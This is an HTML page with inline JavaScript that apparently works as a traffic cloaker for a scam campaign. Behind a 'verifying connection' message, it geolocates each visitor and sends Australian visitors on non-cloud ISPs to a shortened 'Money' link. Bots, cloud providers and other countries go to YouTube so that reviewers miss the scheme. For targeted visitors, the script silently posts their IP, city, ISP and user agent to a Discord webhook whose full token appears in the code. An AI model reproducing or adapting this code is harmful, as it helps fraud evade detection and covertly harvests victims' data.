<html lang="en">
<head>

        body { font-family: sans-serif; background-color: #ffffff; color: #333; text-align: center; padding-top: 10%; }
    </style>

<body>
    <p>Please wait, verifying connection...</p>

    <script>
        // ==========================================
        // CONFIGURATION SECTION
        // ==========================================
        
        // 1. Your Discord Webhook (Only receives CLEAN AU traffic now)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1441937602176614451/8tYzx6G4e41dzrL-86s1f5XTl4rgOhmHk5XqsfwAPr1Iu1NZiUlDjH_etjGwzVjuZvnR"; 

        // 2. The "Money" Link (For Clean AU Humans)
        const AU_PAGE = "https://t.co/D9Z9ZE0";

        // 3. The Safe Link (For Bots, Proxies, and other Countries)
        const SAFE_PAGE = "https://www.youtube.com"; 

        // 4. BLOCKED ISPs (Case insensitive partial match)
        const BLOCKED_ISPS = [
            "IP Volume inc",
            "Alex Largman",
            "AMAZON-AES",
            "GOOGLE-CLOUD-PLATFORM"
        ];

        // ==========================================
        // LOGIC START
        // ==========================================

        async function processVisitor() {
            let destination = SAFE_PAGE; // Default to Safe Page
            
            try {
                // 1. Fetch IP Data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Normalize Data
                const visitorISP = (data.org || "").toLowerCase();
                const visitorCountry = (data.country_code || "").toUpperCase();

                // 3. Check if ISP is on the Block List
                const isBot = BLOCKED_ISPS.some(blockedName => 
                    visitorISP.includes(blockedName.toLowerCase())
                );

                // 4. MAIN LOGIC: Only AU + Not Bot gets the offer
                if (visitorCountry === "AU" && !isBot) {
                    
                    // A. Set Destination to Money Page
                    destination = AU_PAGE;

                    // B. Send Discord Notification (ONLY for this group)
                    const logData = {
                        username: "AU Lead Detected",
                        embeds: [{
                            title: "ðŸ’° New Clean AU Visitor",
                            color: 3066993, // Green
                            fields: [
                                { name: "IP", value: data.ip, inline: true },
                                { name: "City", value: data.city, inline: true },
                                { name: "ISP", value: data.org, inline: false },
                                { name: "User Agent", value: navigator.userAgent, inline: false }
                            ]
                        }]
                    };

                    // Send the log (We don't await this so redirect is faster)
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(logData)
                    });
                }
                // ELSE: Logic falls through to default SAFE_PAGE with NO logging.

            } catch (error) {
                // If API fails, just go to safe page silently
                console.error("Check failed, defaulting to safe page");
            } finally {
                // 5. Execute Redirect
                window.location.href = destination;
            }
        }

        processVisitor();
    </script>
